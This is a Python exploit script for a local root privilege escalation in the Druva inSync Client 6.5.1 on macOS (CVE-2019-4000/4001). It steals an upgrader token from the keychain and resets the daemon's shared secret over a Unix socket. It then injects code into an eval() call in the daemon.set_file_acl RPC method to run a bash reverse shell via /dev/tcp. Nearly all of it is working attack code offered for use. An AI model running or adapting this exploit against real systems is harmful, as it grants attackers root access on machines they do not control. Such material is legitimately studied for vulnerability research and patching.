import os,subprocess,sys,socket,marshal,struct
import time,random
import zlib,zipfile,shutil

# Exploit Title: Druva inSync Client 6.5 OS X Local Privilege Escalation
# Date: 04-10-2020
# Exploit Author: Chris Lyne (@lynerc)
# Vendor Homepage: www.druva.com
# Software Link: https://downloads.druva.com/downloads/inSync/MAC/6.5.1/inSync-6.5.1r96080.dmg
# Version: Druva inSync Client 6.5.1 r96080
# Tested on: Mac OS X
# CVE : CVE-2019-4000, CVE-2019-4001
# See Also: https://www.tenable.com/security/research/tra-2020-12

# you need druva_insync_osx_get_token.zip in the same directory. it will be unzipped at runtime
# start a netcat listener on localhost and you'll get a root shell

def build_post(data):
    message = "POST /api HTTP/1.1" + "\r\n"
    message += "Host: 127.0.0.1" + "\r\n"
    message += "Content-Length: " + str(len(data)) + "\r\n"
    message += "X-Drv-Encoding: 1" + "\r\n"
    message += "\r\n"
    message = message + data
    return message

# message format
# header 7 bytes
#   magic bytes? (3 bytes)
#   length of python object (1 byte)
#   no idea (3 bytes)
# python object
# adler32 checksum (4 bytes)

# leaving sock open on purpose
def send_rpc_request(sock, req_obj, unknown):
    marsh = marshal.dumps(req_obj)  # python object

    # build out the header
    header =  "\x78\x01\x01" + struct.pack('<h', len(marsh))
    header += chr(unknown) # not sure exactly what this is
    header += "\xff"

    # add the ADLER32 checksum
    checksum = struct.pack('>i', zlib.adler32(marsh))

    post_data = header + marsh + checksum
    message = build_post(post_data)
    try:
        sock.send(message)

        resp = sock.recv(1024)

        if resp is None:
            print("Did not receive a response from server.")
    except Exception as e:
        print("Error with request:")
        print(e)

def daemon_authenticate(sock, token):
    daemon_auth = {
        'Requests': [
            {
                'Id': 16,
                'Method': 'daemon.authenticate',
                'KeywordArguments': {},
                'Arguments': (token,),
            }
        ]
    }
    send_rpc_request(sock, daemon_auth, 119)

def gen_random_token(size=20):
    token = ''
    for i in range(0, size):
        rand = random.choice(range(97, 123) + range(48, 58))    # a-z 0-9
        token += chr(rand)
    return token

# rpc service unmarshals object and calls method with arguments
def exploit_set_secrets(token):
    new_token = gen_random_token()
    daemon_set_secrets = {
        'Requests': [
            {
                'Id': 18,
                'Method': 'daemon.set_secrets',
                'KeywordArguments': {},
                'Arguments': ('INSYNC_SHARED_ACCOUNT', {'INSYNC_SHARED_KEY' : new_token},  ),
            }
        ]
    }


    sock_file = '/var/run/inSyncUpgrader.sock'
    if not os.path.exists(sock_file):
        print "Socket does not exist at path: " + sock_file
        return None
    else:
        # do it
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        try:
            s.connect(sock_file)
        except:
            print "Error connecting to socket: " + sock_file
        daemon_authenticate(s, token)
        print "Setting INSYNC_SHARED_KEY (INSYNC_SHARED_ACCOUNT) with value: " + new_token
        send_rpc_request(s, daemon_set_secrets, 70)
        s.close()
        return new_token

# rpc service unmarshals object and calls method with arguments
# daemon.set_file_acl has a python code injection vuln
# CVE-2019-4000
def exploit_set_file_acl(token, py_expr):
    daemon_set_file_acl = {
        'Requests': [
            {
                'Id': 18,
                'Method': 'daemon.set_file_acl',
                'KeywordArguments': {},
                'Arguments': (None, py_expr, None, None,),   # 2nd param is passed to eval()
            }
        ]
    }

    # inSyncDecommission listens on TCP 6059
    ip = '127.0.0.1'
    port = '6059'

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, int(port)))
    daemon_authenticate(s, token)
    send_rpc_request(s, daemon_set_file_acl, 136 - len(py_expr)) # 123
    s.close()

# First, we need to unzip the zip archive
# will extract index.html and node_modules dir
# contains exploit for CVE-2019-4001
zip_filename = 'druva_insync_osx_get_token.zip'

print 'Extracting zip file...'
cwd = os.getcwd()
with zipfile.ZipFile(zip_filename, 'r') as myzip:
    myzip.extractall(cwd)

to_delete = ['index.html', 'node_modules']

executable = '/Applications/Druva\ inSync.app/Contents/Resources/inSync.app'

if not os.path.exists(executable.replace('\\', '')):
    print("Executable does not exist at '" + executable + "'")
    sys.exit(0)

args = 'open ' + executable + ' --args "file://'+cwd+'/index.html" restore no_rfs'
print(args)

sec = 3

print("Attempting to grab token from keychain...A window will pop up.")
with open(os.devnull, 'w') as FNULL:
    p = subprocess.Popen(args, shell=True, stdout=FNULL, stderr=subprocess.STDOUT)
    print("Waiting " + str(5) + " seconds...")
    time.sleep(sec)
    p.kill()

file_name = 'INSYNC_UPG_SHARED_KEY'
path = cwd + '/' + file_name
if not os.path.exists(path):
    print("Uh oh. Didn't get " + file_name + ".")
    sys.exit(0)

to_delete.append(file_name)

upg_token = ''
with open(path, 'r') as f:
    upg_token = f.read()

print(len(upg_token))
print(file_name + '=' + upg_token)

# exploit 1
# set new auth token
new_token = exploit_set_secrets(upg_token)
if new_token is None:
    print "Did not create new token"
    sys.exit(0)

shell_port = "4444"
rev_shell =  "bash -i >& /dev/tcp/127.0.0.1/" + shell_port + " 0>&1"
py_expr = 'os.system("'+rev_shell+'")'
print "Running exploit 2"
exploit_set_file_acl(new_token, py_expr)

# clean up
print("Cleaning up files...")
for f in to_delete:
    print("Deleting " + f)
    if os.path.isdir(f):
        shutil.rmtree(f)
    else:
        os.remove(f)

print("DONE")
